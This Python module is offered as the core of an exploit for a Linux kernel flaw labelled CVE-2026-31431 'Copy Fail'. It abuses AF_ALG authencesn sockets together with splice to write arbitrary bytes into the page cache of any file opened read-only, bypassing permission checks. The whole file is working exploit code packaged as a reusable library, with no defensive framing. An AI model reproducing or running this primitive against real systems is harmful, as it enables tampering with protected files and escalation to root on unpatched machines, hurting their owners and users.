"""
CVE-2026-31431 "Copy Fail" — Core page cache write primitive.

Provides page_cache_write_4bytes() and page_cache_write() helpers
for writing arbitrary data to any readable file's page cache.

Requires: Linux kernel with unpatched AF_ALG authencesn (2017–2026).
Usage:    import copyfail_core; copyfail_core.page_cache_write(fd, off, data)
"""

import os
import socket
import struct

AF_ALG         = 38
SOL_ALG        = 279
ALG_SET_KEY    = 1
ALG_SET_IV     = 2
ALG_SET_OP     = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
ALG_OP_DECRYPT = 0
MSG_MORE       = 0x8000
AUTHSIZE       = 4
ASSOCLEN       = 8

_KEY_BLOB = (
    struct.pack('<HH', 8, 1)   # rtattr: rta_len=8, rta_type=CRYPTO_AUTHENC_KEYA_PARAM
    + struct.pack('>I', 16)    # enckeylen = 16 (AES-128, big-endian)
    + b'\x00' * 32             # authkey(16) + enckey(16)
)


def page_cache_write_4bytes(target_fd: int, file_offset: int, value: bytes):
    """
    Write exactly 4 bytes into the page cache of the file opened as target_fd,
    at the specified file_offset.

    The write bypasses VFS permission checks — O_RDONLY fd is sufficient.
    The kernel page is NOT marked dirty, so disk content is unaffected.
    """
    assert len(value) == 4, "value must be exactly 4 bytes"

    alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    alg.setsockopt(SOL_ALG, ALG_SET_KEY, _KEY_BLOB)
    alg.setsockopt(SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, AUTHSIZE)
    req, _ = alg.accept()

    aad = b"A" * 4 + value  # AAD[4:8] = seqno_lo = value to write

    req.sendmsg(
        [aad],
        [
            (SOL_ALG, ALG_SET_OP, struct.pack('<I', ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV, struct.pack('<I', 16) + b'\x00' * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack('<I', ASSOCLEN)),
        ],
        MSG_MORE,
    )

    pr, pw = os.pipe()
    os.splice(target_fd, pw, file_offset + AUTHSIZE, offset_src=0)
    os.splice(pr, req.fileno(), file_offset + AUTHSIZE)

    try:
        req.recv(ASSOCLEN + file_offset)
    except OSError:
        pass  # expected: HMAC verification fails

    req.close()
    alg.close()
    os.close(pr)
    os.close(pw)


def page_cache_write(target_fd: int, file_offset: int, data: bytes):
    """Write arbitrary-length data to page cache, 4 bytes at a time."""
    for i in range(0, len(data), 4):
        chunk = data[i : i + 4]
        if len(chunk) < 4:
            # Read current bytes to preserve trailing content
            os.lseek(target_fd, file_offset + i, os.SEEK_SET)
            existing = os.read(target_fd, 4)
            chunk = chunk + existing[len(chunk):]
        page_cache_write_4bytes(target_fd, file_offset + i, chunk)
